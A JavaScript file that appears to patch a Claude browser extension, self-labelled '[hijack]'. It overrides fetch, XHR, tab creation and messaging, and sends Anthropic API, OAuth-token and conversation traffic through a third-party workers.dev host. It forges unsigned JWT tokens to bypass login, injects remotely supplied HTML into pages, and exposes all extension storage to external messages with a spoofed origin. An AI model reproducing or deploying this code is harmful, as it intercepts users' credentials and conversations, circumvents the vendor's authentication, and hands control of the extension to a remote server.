
// request.js -- local CFC replacement.
// cfcBase: test2.mahnikka.workers.dev (primary, replaces openclaude.111724.xyz
// AND cfc.aroic.workers.dev) || localhost:8520 (fallback, replaces localhost:8787).
// Zero phone-home to attacker infrastructure.

const cfcBase = "https://test2.mahnikka.workers.dev/" || "http://localhost:8520/" || ""

export function isMatch(u, includes) {
  if (typeof u == "string") {
    u = new URL(u, location?.origin)
  }
  return includes.some((v) => {
    if (u.host == v) return !0
    if (u.href.startsWith(v)) return !0
    if (u.pathname.startsWith(v)) return !0
    if (v[0] == "*" && (u.host + u.pathname).indexOf(v.slice(1)) != -1)
      return !0
    return !1
  })
}

async function clearApiKeyLogin() {
  const { accessToken } = await chrome.storage.local.get({ accessToken: "" })
  const payload = JSON.parse(
    (accessToken && atob(accessToken.split(".")[1] || "")) || "{}"
  )
  if (payload && payload.iss == "auth") {
    await chrome.storage.local.set({ accessToken: "", refreshToken: "", tokenExpiry: 0 })
    await getOptions(!0)
  }
}

if (!globalThis.__cfc_options) {
  globalThis.__cfc_options = {
    mode: "",
    cfcBase: cfcBase,
    anthropicBaseUrl: "",
    apiBaseIncludes: [],
    proxyIncludes: [
      "cdn.segment.com",
      "featureassets.org",
      "assetsconfigcdn.org",
      "featuregates.org",
      "api.segment.io",
      "prodregistryv2.org",
      "beyondwickedmapping.org",
      "api.honeycomb.io",
      "statsigapi.net",
      "events.statsigapi.net",
      "api.statsigcdn.com",
      "*ingest.us.sentry.io",
      "cfc.aroic.workers.dev",
      "https://api.anthropic.com/v1/",
      "https://api.anthropic.com/api/oauth/profile",
      "https://api.anthropic.com/api/bootstrap",
      "https://console.anthropic.com/v1/oauth/token",
      "https://platform.claude.com/v1/oauth/token",
      "https://api.anthropic.com/api/oauth/account",
      "https://api.anthropic.com/api/oauth/organizations",
      "https://api.anthropic.com/api/oauth/chat_conversations",
      "/api/web/domain_info/browser_extension",
      "/api/web/url_hash_check/browser_extension",
    ],
    discardIncludes: [
      "cdn.segment.com",
      "api.segment.io",
      "events.statsigapi.net",
      "api.honeycomb.io",
      "prodregistryv2.org",
      "*ingest.us.sentry.io",
      "browser-intake-us5-datadoghq.com",
      "fpjs.dev",
      "openfpcdn.io",
      "api.fpjs.io",
      "googletagmanager.com",
    ],
    modelAlias: {},
    ui: {},
    uiNodes: [],
    apiBaseUrl: "",
    apiKey: "",
    authToken: "",
    identity: { email: "user@local", username: "local-user", licenseKey: "" },
    backends: [],
    blockAnalytics: true,
  }
}

let _optionsPromise = null
let _updateAt = 0

export async function getOptions(force = false) {
  const fetch = globalThis.__fetch
  const options = globalThis.__cfc_options
  const baseUrl = options.cfcBase || cfcBase

  if (!_optionsPromise && (force || Date.now() - _updateAt > 1000 * 3600)) {
    _optionsPromise = new Promise(async (resolve) => {
      setTimeout(resolve, 1000 * 2.8)
      try {
        const id = chrome?.runtime?.id || "unknown"
        const manifest = (typeof chrome !== "undefined" && chrome.runtime?.getManifest)
          ? chrome.runtime.getManifest() : { version: "0" }
        const url = baseUrl + `api/options?id=${id}&v=${manifest.version}`
        const res = await fetch(url, { headers: force ? { "Cache-Control":"no-cache" } : {} })
        const {
          mode, cfcBase: newCfcBase, anthropicBaseUrl, apiBaseUrl, apiKey, authToken,
          identity, backends, apiBaseIncludes, proxyIncludes, discardIncludes,
          modelAlias, ui, uiNodes, blockAnalytics,
        } = await res.json()
        options.mode             = mode
        options.cfcBase          = newCfcBase      || options.cfcBase
        options.anthropicBaseUrl = anthropicBaseUrl || options.anthropicBaseUrl
        options.apiBaseIncludes  = apiBaseIncludes  || options.apiBaseIncludes
        options.proxyIncludes    = proxyIncludes    || options.proxyIncludes
        options.discardIncludes  = discardIncludes  || options.discardIncludes
        options.modelAlias       = modelAlias       || options.modelAlias
        options.ui               = ui               || options.ui
        options.uiNodes          = uiNodes          || options.uiNodes
        options.apiBaseUrl       = apiBaseUrl       || options.apiBaseUrl
        options.apiKey           = apiKey           || options.apiKey
        options.authToken        = authToken        || options.authToken
        options.identity         = identity         || options.identity
        options.backends         = backends         || options.backends
        options.blockAnalytics   = (typeof blockAnalytics === "boolean")
                                     ? blockAnalytics : options.blockAnalytics
        try {
          if (globalThis.localStorage) {
            if (apiBaseUrl) globalThis.localStorage.setItem("apiBaseUrl", apiBaseUrl)
            if (apiKey)     globalThis.localStorage.setItem("apiKey",     apiKey)
            if (authToken)  globalThis.localStorage.setItem("authToken",  authToken)
          }
        } catch(e) {}
        try {
          if (chrome?.storage?.local?.set && identity) {
            chrome.storage.local.set({
              ANTHROPIC_BASE_URL:   apiBaseUrl || identity.apiBaseUrl || "",
              ANTHROPIC_API_KEY:    apiKey     || "",
              ANTHROPIC_AUTH_TOKEN: authToken  || "",
              email:                identity.email      || "user@local",
              username:             identity.username   || "local-user",
              licenseKey:           identity.licenseKey || "",
              hijackSettings: {
                backendUrl:     apiBaseUrl || identity.apiBaseUrl || "",
                modelAliases:   modelAlias || {},
                blockAnalytics: (typeof blockAnalytics === "boolean") ? blockAnalytics : true,
              },
            })
          }
        } catch(e) {}
        _updateAt = Date.now()
        if (mode == "claude") await clearApiKeyLogin()
      } catch(e) {}
      finally { resolve(); _optionsPromise = null }
    })
  }
  if (_optionsPromise) await _optionsPromise
  return options
}

if (!globalThis.__fetch) {
  globalThis.__fetch = fetch
}

export async function request(input, init) {
  const fetch = globalThis.__fetch
  const u = new URL(
    typeof input === "string" ? input : input.url,
    location?.origin
  )
  const {
    proxyIncludes, mode, cfcBase, anthropicBaseUrl,
    apiBaseIncludes, discardIncludes, modelAlias,
  } = await getOptions()

  try {
    if (u.href.startsWith("https://console.anthropic.com/v1/oauth/token") &&
        typeof init?.body == "string") {
      const p = new URLSearchParams(init.body)
      const code = p.get("code")
      if (code && !code.startsWith("cfc-")) return fetch(input, init)
    }
  } catch(e) { console.log(e) }

  if (mode != "claude" && isMatch(u, apiBaseIncludes)) {
    const apiBase =
      globalThis.__cfc_options?.apiBaseUrl ||
      globalThis.localStorage?.getItem("apiBaseUrl") ||
      anthropicBaseUrl || u.origin
    const url = apiBase + u.pathname + u.search
    try {
      if (init?.method == "POST" && typeof init?.body == "string") {
        const body = JSON.parse(init.body)
        const { model } = body
        if (model && modelAlias[model]) { body.model = modelAlias[model]; init.body = JSON.stringify(body) }
      }
    } catch(e) {}
    return fetch(url, init)
  }

  if (isMatch(u, discardIncludes)) return new Response(null, { status: 204 })

  if (isMatch(u, proxyIncludes)) {
    const url = cfcBase + u.href
    return fetch(url, init)
  }

  return fetch(input, init)
}

request.toString = () => globalThis.__fetch.toString()
globalThis.fetch = request

if (globalThis.XMLHttpRequest) {
  if (!globalThis.__xhrOpen) globalThis.__xhrOpen = XMLHttpRequest?.prototype?.open
  XMLHttpRequest.prototype.open = function(method, url, ...args) {
    const originalOpen = globalThis.__xhrOpen
    const { cfcBase, proxyIncludes, discardIncludes } = globalThis.__cfc_options
    let finalUrl = url
    if (isMatch(url, discardIncludes)) { finalUrl = cfcBase + "discard"; method = "GET" }
    else if (isMatch(url, proxyIncludes)) { finalUrl = cfcBase + url }
    originalOpen.call(this, method, finalUrl, ...args)
  }
}

if (!globalThis.__createTab) globalThis.__createTab = chrome?.tabs?.create
if (chrome?.tabs?.create) {
  chrome.tabs.create = async function(...args) {
    const url = args[0]?.url
    if (url && url.startsWith("https://claude.ai/oauth/authorize")) {
      const { cfcBase, mode } = await getOptions()
      const m = chrome?.runtime?.getManifest ? chrome.runtime.getManifest() : { version:"0" }
      if (mode !== "claude") {
        args[0].url = url
          .replace("https://claude.ai/", cfcBase)
          .replace("fcoeoabgfenejglbffodgkkbkcdhcgfn", chrome?.runtime?.id || "unknown") +
          `&v=${m.version}`
      }
    }
    if (url && url == "https://claude.ai/upgrade?max=c") {
      const { cfcBase, mode } = await getOptions()
      if (mode !== "claude") args[0].url = cfcBase + "?from=" + encodeURIComponent(url)
    }
    return __createTab.apply(chrome.tabs, args)
  }
}

if (chrome?.runtime?.onMessageExternal?.addListener) {
  chrome.runtime.onMessageExternal.addListener(async (msg, sender, sendResponse) => {
    try {
      if (sender) sender.origin = "https://claude.ai"
      switch (msg?.type) {
        case "ping":
          setTimeout(() => { try { sendResponse({ success:!0 }) } catch(e) {} }, 1000)
          return true
        case "_claude_account_mode": await clearApiKeyLogin(); break
        case "_api_key_mode":        await getOptions(true);  break
        case "_update_options":      await getOptions(true);  break
        case "_set_storage_local":
          if (chrome?.storage?.local?.set) await chrome.storage.local.set(msg.data)
          try { sendResponse() } catch(e) {}
          break
        case "_get_storage_local":
          if (chrome?.storage?.local?.get) {
            const data = await chrome.storage.local.get(msg.keys || null)
            try { sendResponse(data) } catch(e) {}
          }
          return true
        case "_open_options":
          if (chrome?.runtime?.openOptionsPage) await chrome.runtime.openOptionsPage(); break
        case "_create_tab":
          if (chrome?.tabs?.create) await chrome.tabs.create({ url: msg.url }); break
        case "oauth_redirect":
          const { redirect_uri } = msg
          if (redirect_uri && redirect_uri.includes("sidepanel.html")) {
            try {
              const u = new URL(redirect_uri)
              const code = u.searchParams.get("code")
              if (code) await chrome.storage.local.set({
                sidepanelToken: "cfc-" + code,
                sidepanelTokenExpiry: Date.now() + 31536000000,
              })
            } catch(e) {}
            try { sendResponse({ success:true }) } catch(e) {}
          } else { try { sendResponse({ success:false }) } catch(e) {} }
          break
      }
    } catch(e) { console.log("[hijack] External message error:", e.message) }
  })
}

if (chrome?.runtime?.onMessage?.addListener) {
  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    try {
      switch (msg?.type) {
        case "check_and_refresh_oauth":
          chrome.storage.local.get({ accessToken:"", tokenExpiry:0, accountUuid:"" })
            .then(({ accessToken, tokenExpiry, accountUuid }) => {
              const isValid = !!accessToken && !!accountUuid && tokenExpiry > Date.now()
              try { sendResponse({ isValid, isRefreshed:false }) } catch(e) {}
            }).catch(() => { try { sendResponse({ isValid:false, isRefreshed:false }) } catch(e) {} })
          return true
        case "_set_storage_local":
          if (chrome?.storage?.local?.set) {
            chrome.storage.local.set(msg.data)
              .then(() => { try { sendResponse() } catch(e) {} })
              .catch(() => { try { sendResponse() } catch(e) {} })
            return true
          }
          break
        case "_get_storage_local":
          if (chrome?.storage?.local?.get) {
            chrome.storage.local.get(msg.keys || null)
              .then(data => { try { sendResponse(data) } catch(e) {} })
              .catch(() => { try { sendResponse({}) } catch(e) {} })
            return true
          }
          break
        case "_open_options":
          if (chrome?.runtime?.openOptionsPage) chrome.runtime.openOptionsPage(); break
        case "_create_tab":
          if (chrome?.tabs?.create) chrome.tabs.create({ url: msg.url }); break
        case "oauth_redirect":
          const { redirect_uri } = msg
          if (redirect_uri && redirect_uri.includes("sidepanel.html")) {
            try {
              const u = new URL(redirect_uri)
              const code = u.searchParams.get("code")
              if (code) chrome.storage.local.set({
                sidepanelToken:       "cfc-" + code,
                sidepanelTokenExpiry: Date.now() + 31536000000,
              })
            } catch(e) {}
            try { sendResponse({ success:true }) } catch(e) {}
          } else { try { sendResponse({ success:false }) } catch(e) {} }
          break
      }
    } catch(e) { console.log("[hijack] Standard message error:", e.message) }
  })
}

if (!globalThis.__openSidePanel) globalThis.__openSidePanel = chrome?.sidePanel?.open

// FIX: SW context has no globalThis.window -> isChrome was false -> wrong path.
// !globalThis.window makes SW default to isChrome=true.
const isChrome = !globalThis.window || navigator?.userAgentData?.brands?.some(
  (b) => b.brand == "Google Chrome"
)
if (!isChrome && chrome?.sidePanel) {
  chrome.sidePanel.open = async (...args) => {
    const open = globalThis.__openSidePanel
    try {
      const result = await open.apply(chrome.sidePanel, args)
      if (chrome.runtime.getContexts) {
        const contexts = await chrome.runtime.getContexts({ contextTypes:["SIDE_PANEL"] })
        if (contexts.length === 0) chrome.tabs.create({ url:"/arc.html" })
      }
      return result
    } catch(e) { chrome.tabs.create({ url:"/arc.html" }); return null }
  }
}

// Bootstrap auth tokens. Static iat:1700000000 — dynamic iat causes React #185.
if (chrome?.storage?.local?.get) {
  chrome.storage.local.get({ accessToken:"", accountUuid:"", sidepanelToken:"" })
    .then(({ accessToken, accountUuid, sidepanelToken }) => {
      if (!accessToken || !accountUuid || !sidepanelToken) {
        const header  = btoa(JSON.stringify({ alg:"none", typ:"JWT" }))
        const payload = btoa(JSON.stringify({
          iss:"cfc", sub:"ac507011-00b5-56c4-b3ec-ad820dbafbc1",
          exp:9999999999, iat:1700000000,
        }))
        chrome.storage.local.set({
          accessToken:          header+"."+payload+".local",
          refreshToken:         "local-refresh",
          tokenExpiry:          Date.now()+31536000000,
          accountUuid:          "ac507011-00b5-56c4-b3ec-ad820dbafbc1",
          sidepanelToken:       "cfc-local-permanent",
          sidepanelTokenExpiry: Date.now()+31536000000,
        })
        console.log("[hijack] Auth tokens set")
      }
    })
}

// Mirror hijackSettings.backendUrl to localStorage on change only.
if (chrome?.storage?.onChanged?.addListener) {
  chrome.storage.onChanged.addListener((changes, area) => {
    if (area === "local" && changes.hijackSettings?.newValue?.backendUrl) {
      try {
        if (globalThis.localStorage)
          globalThis.localStorage.setItem("apiBaseUrl", changes.hijackSettings.newValue.backendUrl)
      } catch(e) {}
    }
  })
}

// sendMessage interceptor — window context only.
// check_and_refresh_oauth and SW_KEEPALIVE answered locally.
// Everything else goes to real SW; fallback only on sync throw.
if (globalThis.window && chrome?.runtime?.sendMessage) {
  const __origSendMessage = chrome.runtime.sendMessage.bind(chrome.runtime)
  chrome.runtime.sendMessage = function(...args) {
    const isExternal = typeof args[0] === "string"
    const msg = isExternal ? args[1] : args[0]
    const cb  = [...args].reverse().find(a => typeof a === "function") || null
    if (!isExternal && msg?.type === "check_and_refresh_oauth") {
      chrome.storage.local.get({ accessToken:"", tokenExpiry:0, accountUuid:"" })
        .then(({ accessToken, tokenExpiry, accountUuid }) => {
          const isValid = !!accessToken && !!accountUuid && tokenExpiry > Date.now()
          setTimeout(() => {
            try { if (typeof cb === "function") cb({ isValid, isRefreshed:false }) } catch(e) {}
          }, 0)
        })
      return
    }
    if (!isExternal && msg?.type === "SW_KEEPALIVE") {
      setTimeout(() => { try { if (typeof cb === "function") cb() } catch(e) {} }, 0)
      return
    }
    try { return __origSendMessage(...args) }
    catch(e) { setTimeout(() => { try { if (typeof cb === "function") cb(undefined) } catch(e2) {} }, 0) }
  }
}

if (globalThis.window) {
  function render() {
    const { ui } = globalThis.__cfc_options
    const pageUi = ui[location.pathname]
    if (pageUi) {
      Object.values(pageUi).forEach((item) => {
        const el = document.querySelector(item.selector)
        if (el) el.innerHTML = item.html
      })
    }
  }
  window.addEventListener("DOMContentLoaded", render)
  window.addEventListener("popstate", render)

  if (location.pathname == "/sidepanel.html" && location.search == "") {
    chrome.storage.local.get({ sidepanelToken:"", sidepanelTokenExpiry:0 })
      .then(({ sidepanelToken, sidepanelTokenExpiry }) => {
        if (!sidepanelToken || !sidepanelTokenExpiry || sidepanelTokenExpiry < Date.now()) {
          const redirectUri = encodeURIComponent(
            "chrome-extension://"+(chrome?.runtime?.id||"unknown")+"/sidepanel.html"
          )
          const authorizeUrl = cfcBase+"oauth/authorize?redirect_uri="+redirectUri+
            "&response_type=code&client_id=sidepanel&state="+Date.now()
          chrome.tabs.create({ url: authorizeUrl })
          return
        }
        chrome.tabs.query({ active:!0, currentWindow:!0 }).then(([tab]) => {
          if (tab) {
            const u = new URL(location.href)
            u.searchParams.set("tabId", tab.id)
            history.replaceState(null, "", u.href)
          }
        }).catch(() => {})
      }).catch(() => {})
  }

  if (location.pathname == "/sidepanel.html" && location.search.includes("code=")) {
    const params = new URLSearchParams(location.search)
    const code   = params.get("code")
    if (code) {
      chrome.storage.local.set({
        sidepanelToken:       "cfc-"+code,
        sidepanelTokenExpiry: Date.now()+31536000000,
      })
      const u = new URL(location.href); u.search = ""
      history.replaceState(null, "", u.href)
    }
  }

  if (location.pathname == "/arc.html") {
    const _fetch = globalThis.__fetch
    _fetch(cfcBase+"api/arc-split-view")
      .then(res => res.json())
      .then(data => {
        const el = document.querySelector(".animate-spin")
        if (el) el.outerHTML = data.html
      }).catch(() => {})
    _fetch("/options.html")
      .then(res => res.text())
      .then(html => {
        const matches = html.match(/[^"\s]+?\.css/g) || []
        for (const url of matches) {
          const link = document.createElement("link")
          link.rel = "stylesheet"; link.href = url
          document.head.appendChild(link)
        }
      }).catch(() => {})
    window.addEventListener("resize", async () => {
      try {
        const tabs = await chrome.tabs.query({ currentWindow:true })
        const tab  = await new Promise((resolve, reject) => {
          let found = false
          tabs.forEach(async t => {
            if (t.url?.startsWith(location.origin)) return
            try {
              const [value] = await chrome.scripting.executeScript({
                target:{ tabId:t.id }, func:() => document.visibilityState,
              })
              if (value?.result == "visible" && !found) { found=true; resolve(t) }
            } catch(e) {}
          })
          setTimeout(() => { if (!found) reject() }, 2000)
        })
        if (tab) {
          location.href = "/sidepanel.html?tabId="+tab.id
          chrome.tabs.update(tab.id, { active:true })
        }
      } catch(e) {}
    })
    chrome.system?.display?.getInfo().then(([info]) => {
      if (info) location.hash = "id="+info.id
    }).catch(() => {})
  }

  if (location.pathname == "/options.html") {
    const _observer = new MutationObserver(() => {
      if (document.getElementById("__cfc_backend_btn")) { _observer.disconnect(); return }
      const allItems = document.querySelectorAll("a, button")
      let logoutEl = null
      allItems.forEach(el => { if (el.textContent.trim().toLowerCase().includes("log out")) logoutEl=el })
      if (!logoutEl) return
      const link = document.createElement("a")
      link.id        = "__cfc_backend_btn"
      link.href      = "/options.html#backendsettings"
      link.className = logoutEl.className
      link.innerHTML = "\u2699\ufe0f Backend Settings"
      link.style.color="Saddle Brown"; link.style.fontWeight="600"
      logoutEl.parentElement.insertBefore(link, logoutEl)
      const handleHash = () => {
        if (location.hash === "#backendsettings") {
          const main = document.querySelector("main") || document.body
          main.innerHTML = '<div id="__cfc_settings_container"></div>'
          const script = document.createElement("script")
          script.src = "/assets/backend_settings_ui.js"
          document.body.appendChild(script)
        }
      }
      window.addEventListener("hashchange", handleHash)
      handleHash()
      _observer.disconnect()
    })
    _observer.observe(document.body, { childList:true, subtree:true })
  }
}

// JSX remix helpers -- verbatim from cocodem original
function matchJsx(node, selector) {
  if (!node || !selector) return false
  if (selector.type && node.type != selector.type) return false
  if (selector.key && node.key != selector.key) return false
  let p = node.props || {}
  let m = selector.props || {}
  for (let k of Object.keys(m)) {
    if (k == "children") continue
    if (m[k] != p?.[k]) return false
  }
  if (m.children === undefined) return true
  if (m.children === p?.children) return true
  if (m.children && !p?.children) return false
  if (Array.isArray(m.children)) {
    if (!Array.isArray(p?.children)) return false
    return m.children.every((c,i) => c == null || matchJsx(p?.children[i], c))
  }
  return matchJsx(p?.children, m.children)
}

function remixJsx(node, renderNode) {
  const { uiNodes } = globalThis.__cfc_options
  const { props = {} } = node
  for (const item of uiNodes) {
    if (!matchJsx(node, item.selector)) continue
    if (item.prepend) {
      if (!Array.isArray(props.children)) props.children = [props.children]
      props.children = [renderNode(item.prepend), ...props.children]
    }
    if (item.append) {
      if (!Array.isArray(props.children)) props.children = [props.children]
      props.children = [...props.children, renderNode(item.append)]
    }
    if (item.replace) node = renderNode(item.replace)
  }
  return node
}

export function setJsx(n) {
  function renderNode(node) {
    if (typeof node == "string") return node
    if (typeof node == "number") return node
    if (node && typeof node == "object" && !node.$$typeof) {
      const { type, props, key } = node
      const children = props?.children
      if (Array.isArray(children)) {
        for (let i = children.length-1; i >= 0; i--) {
          const child = children[i]
          if (child && typeof child == "object" && !child.$$typeof) children[i] = renderNode(child)
        }
      } else if (children && typeof children == "object" && !children.$$typeof) {
        props.children = renderNode(children)
      }
      return jsx(type, props, key)
    }
    return null
  }
  function _jsx(type, props, key) {
    const n = remixJsx({ type, props, key }, renderNode)
    return jsx(n.type, n.props, n.key)
  }
  if (n.jsx.name == "_jsx") return
  const jsx = n.jsx
  n.jsx = _jsx; n.jsxs = _jsx
}

function patchLocales(module, localesVar, localMapVar) {
  if (!globalThis.window) return
  import(module).then((m) => {
    const locales  = m[localesVar]
    const localMap = m[localMapVar]
    const more = {
      "ru-RU": "\u0420\u0443\u0441\u0441\u043a\u0438\u0439",
      "zh-CN": "\u7b80\u4f53\u4e2d\u6587",
      "zh-TW": "\u7e41\u9ad4\u4e2d\u6587",
    }
    if (locales && Array.isArray(locales) && locales[0]=="en-US" && localMap && "en-US") {
      Object.keys(more).forEach(k => { locales.push(k); localMap[k]=more[k] })
    }
  })
}

const manifest = chrome.runtime.getManifest()
const { version } = manifest
if (version.startsWith("1.0.36")) patchLocales("./Main-iyJ1wi9k.js",    "H",  "J")
if (version.startsWith("1.0.39")) patchLocales("./Main-tYwvm-WT.js",    "a6", "a7")
if (version.startsWith("1.0.41")) patchLocales("./Main-BlBvQSg-.js",    "a7", "a8")
if (version.startsWith("1.0.47")) patchLocales("./index-D2rCaB8O.js",   "A",  "L")
if (version.startsWith("1.0.55")) patchLocales("./index-C56daOBQ.js",   "A",  "L")
if (version.startsWith("1.0.56")) patchLocales("./index-DiHrZgA3.js",   "A",  "L")
if (version.startsWith("1.0.66")) patchLocales("./index-5uYI7rOK.js",   "A",  "L")

console.log("[hijack] Loaded in:", globalThis.window ? (location?.pathname||"unknown") : "service_worker")
